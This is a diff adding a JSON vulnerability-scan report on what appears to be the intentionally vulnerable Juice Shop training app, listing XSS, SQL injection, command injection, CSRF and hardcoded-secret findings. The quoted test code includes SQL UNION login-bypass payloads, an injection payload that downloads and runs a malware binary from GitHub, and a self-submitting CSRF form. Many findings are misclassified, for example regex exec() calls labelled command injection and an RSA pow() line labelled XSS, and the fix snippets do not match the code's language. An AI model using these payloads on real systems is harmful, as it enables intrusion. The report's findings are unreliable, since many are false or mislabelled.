+      "code": "b-20+\"px\"):(g.removeClass(a.domElement,m.CLASS_TOO_TALL),a.__ul.style.height=\"auto\")}a.__resize_handle&&h.defer(function(){a.__resize_handle.style.height=a.__ul.offsetHeight+\"px\"});a.__closeButton&&(a.__closeButton.style.width=a.width+\"px\")},remember:function(){h.isUndefined(A)&&(A=new y,A.domElement.innerHTML=a);if(this.parent)throw Error(\"You can only call remember on a top level GUI.\");var b=this;h.each(Array.prototype.slice.call(arguments),function(a){0==b.__rememberedObjects.length&&K(b);-1",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248748",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/stats.min.js",
+      "line": 3,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "i.innerHTML=\"FPS\";a.appendChild(i);var c=document.createElement(\"div\");c.id=\"fpsGraph\";c.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0ff\";for(a.appendChild(c);74>c.children.length;){var j=document.createElement(\"span\");j.style.cssText=\"width:1px;height:30px;float:left;background-color:#113\";c.appendChild(j)}var d=document.createElement(\"div\");d.id=\"ms\";d.style.cssText=\"padding:0 0 3px 3px;text-align:left;background-color:#020;display:none\";f.appendChild(d);var k=doc",
+      "code": "i.innerHTML=\"FPS\";a.appendChild(i);var c=document.createElement(\"div\");c.id=\"fpsGraph\";c.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0ff\";for(a.appendChild(c);74>c.children.length;){var j=document.createElement(\"span\");j.style.cssText=\"width:1px;height:30px;float:left;background-color:#113\";c.appendChild(j)}var d=document.createElement(\"div\");d.id=\"ms\";d.style.cssText=\"padding:0 0 3px 3px;text-align:left;background-color:#020;display:none\";f.appendChild(d);var k=doc",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248757",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/stats.min.js",
+      "line": 4,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "k.id=\"msText\";k.style.cssText=\"color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px\";k.innerHTML=\"MS\";d.appendChild(k);var e=document.createElement(\"div\");e.id=\"msGraph\";e.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0f0\";for(d.appendChild(e);74>e.children.length;)j=document.createElement(\"span\"),j.style.cssText=\"width:1px;height:30px;float:left;background-color:#131\",e.appendChild(j);var t=function(b){s=b;switch(s){case 0",
+      "code": "k.id=\"msText\";k.style.cssText=\"color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px\";k.innerHTML=\"MS\";d.appendChild(k);var e=document.createElement(\"div\");e.id=\"msGraph\";e.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0f0\";for(d.appendChild(e);74>e.children.length;)j=document.createElement(\"span\"),j.style.cssText=\"width:1px;height:30px;float:left;background-color:#131\",e.appendChild(j);var t=function(b){s=b;switch(s){case 0",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248765",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 310,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "var color = /^rgb\\((\\d+), ?(\\d+), ?(\\d+)\\)$/i.exec( style );",
+      "code": "var color = /^rgb\\((\\d+), ?(\\d+), ?(\\d+)\\)$/i.exec( style );",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248774",
+      "category": "Command Injection"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 324,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "var color = /^rgb\\((\\d+)\\%, ?(\\d+)\\%, ?(\\d+)\\%\\)$/i.exec( style );",
+      "code": "var color = /^rgb\\((\\d+)\\%, ?(\\d+)\\%, ?(\\d+)\\%\\)$/i.exec( style );",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248783",
+      "category": "Command Injection"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 338,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "var color = /^\\#([0-9a-f]{6})$/i.exec( style );",
+      "code": "var color = /^\\#([0-9a-f]{6})$/i.exec( style );",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248791",
+      "category": "Command Injection"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 350,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "var color = /^\\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.exec( style );",
+      "code": "var color = /^\\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.exec( style );",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248799",
+      "category": "Command Injection"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 11354,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "e.innerHTML = \"Loading ...\";",
+      "code": "e.innerHTML = \"Loading ...\";",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248807",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/three.js",
+      "line": 11375,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "this.statusDomElement.innerHTML = message;",
+      "code": "this.statusDomElement.innerHTML = message;",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248815",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/hacking-instructor/index.ts",
+      "line": 126,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "textBox.innerHTML = snarkdown(hint.text)",
+      "code": "textBox.innerHTML = snarkdown(hint.text)",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248825",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/hacking-instructor/index.ts",
+      "line": 142,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "cancelButton.innerHTML = '<div>&times;</div>'",
+      "code": "cancelButton.innerHTML = '<div>&times;</div>'",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248834",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/hacking-instructor/helpers/helpers.ts",
+      "line": 138,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "if (element && element.innerHTML === value) {",
+      "code": "if (element && element.innerHTML === value) {",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248843",
+      "category": "XSS"
+    },
+    {
+      "file": "lib/codingChallenges.ts",
+      "line": 76,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "if (new RegExp(`vuln-code-snippet vuln-line.*${challengeKey}`).exec(lines[i]) != null) {",
+      "code": "if (new RegExp(`vuln-code-snippet vuln-line.*${challengeKey}`).exec(lines[i]) != null) {",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248853",
+      "category": "Command Injection"
+    },
+    {
+      "file": "lib/codingChallenges.ts",
+      "line": 78,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "} else if (new RegExp(`vuln-code-snippet neutral-line.*${challengeKey}`).exec(lines[i]) != null) {",
+      "code": "} else if (new RegExp(`vuln-code-snippet neutral-line.*${challengeKey}`).exec(lines[i]) != null) {",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248861",
+      "category": "Command Injection"
+    },
+    {
+      "file": "routes/login.ts",
+      "line": 34,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248869",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 236,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248879",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 238,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "code": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248887",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 282,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248895",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 284,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "code": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248903",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 311,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248911",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 313,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "code": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248919",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 340,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248927",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 342,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "code": "const secret = 'ASDVAJSDUASZGDIADBJS'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248953",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 369,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = 'EinBelegtesBrotMitSchinkenSCHINKEN!'",
+      "code": "const password = 'EinBelegtesBrotMitSchinkenSCHINKEN!'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248977",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 398,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248989",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/2faSpec.ts",
+      "line": 435,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = '123456'",
+      "code": "const password = '123456'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248999",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "test/api/loginApiSpec.ts",
+      "line": 216,
+      "vulnerability_type": "SQL Injection",
+      "type": "SQL Injection",
+      "severity": "High",
+      "code_snippet": "email: `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${config.get<string>('application.domain')}' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`,",
+      "code": "email: `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${config.get<string>('application.domain')}' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`,",
+      "fix": {
+        "explanation": "User input is directly concatenated into SQL query which allows attackers to inject malicious SQL.",
+        "recommendation": "Use parameterized queries or prepared statements.",
+        "example": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
+        "copy_fix_snippet": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+      },
+      "cwe": "CWE-89",
+      "business_impact": "Attackers may read, modify, or delete sensitive database records.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249026",
+      "category": "SQL Injection"
+    },
+    {
+      "file": "test/cypress/e2e/login.spec.ts",
+      "line": 168,
+      "vulnerability_type": "SQL Injection",
+      "type": "SQL Injection",
+      "severity": "High",
+      "code_snippet": "\"' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--\"",
+      "code": "\"' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--\"",
+      "fix": {
+        "explanation": "User input is directly concatenated into SQL query which allows attackers to inject malicious SQL.",
+        "recommendation": "Use parameterized queries or prepared statements.",
+        "example": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
+        "copy_fix_snippet": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+      },
+      "cwe": "CWE-89",
+      "business_impact": "Attackers may read, modify, or delete sensitive database records.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249038",
+      "category": "SQL Injection"
+    },
+    {
+      "file": "test/cypress/e2e/profile.spec.ts",
+      "line": 55,
+      "vulnerability_type": "Command Injection",
+      "type": "Command Injection",
+      "severity": "High",
+      "code_snippet": "\"#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}\",",
+      "code": "\"#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}\",",
+      "fix": {
+        "explanation": "User input is passed to system commands allowing arbitrary command execution.",
+        "recommendation": "Avoid passing raw user input to system calls.",
+        "example": "subprocess.run(['ls', user_input])",
+        "copy_fix_snippet": "subprocess.run(['ls', user_input])"
+      },
+      "cwe": "CWE-78",
+      "business_impact": "Attackers may execute arbitrary commands and compromise the host.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249047",
+      "category": "Command Injection"
+    },
+    {
+      "file": "test/cypress/e2e/profile.spec.ts",
+      "line": 76,
+      "vulnerability_type": "CSRF",
+      "type": "CSRF",
+      "severity": "Medium",
+      "code_snippet": "/* <form action=\"http://localhost:3000/profile\" method=\"POST\"><input type=\"hidden\" name=\"username\" value=\"CSRF\"/><input type=\"submit\"/></form><script>document.forms[0].submit();</script> */",
+      "code": "/* <form action=\"http://localhost:3000/profile\" method=\"POST\"><input type=\"hidden\" name=\"username\" value=\"CSRF\"/><input type=\"submit\"/></form><script>document.forms[0].submit();</script> */",
+      "fix": {
+        "explanation": "State-changing actions can be triggered without verifying request origin/token.",
+        "recommendation": "Use anti-CSRF tokens and validate them on every state-changing request.",
+        "example": "token = request.form.get('csrf_token')\nif token != session.get('csrf_token'):\n    abort(403)",
+        "copy_fix_snippet": "token = request.form.get('csrf_token')\nif token != session.get('csrf_token'):\n    abort(403)"
+      },
+      "cwe": "CWE-352",
+      "business_impact": "Attackers can trigger unauthorized state changes using victim sessions.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249055",
+      "category": "CSRF"
+    },
+    {
+      "file": "test/files/encrypt.py",
+      "line": 14,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "encrypted_document.write(str(pow(ord(char), e, N)) + '\\n')",
+      "code": "encrypted_document.write(str(pow(ord(char), e, N)) + '\\n')",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249068",
+      "category": "XSS"
+    },
+    {
+      "file": "test/server/currentUserSpec.ts",
+      "line": 33,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "req.cookies.token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmcifSwiaWF0IjoxNTgyMjIyMzY0fQ.CHiFQieZudYlrd1o8Ih-Izv7XY_WZupt8Our-CP9HqsczyEKqrWC7wWguOgVuSGDN_S3mP4FyuEFN8l60aAhVsUbqzFetvJkFwe5nKVhc9dHuen6cujQLMcTlHLKassOSDP41Q-MkKWcUOQu0xUkTMfEq2hPMHpMosDb4benzH0'",
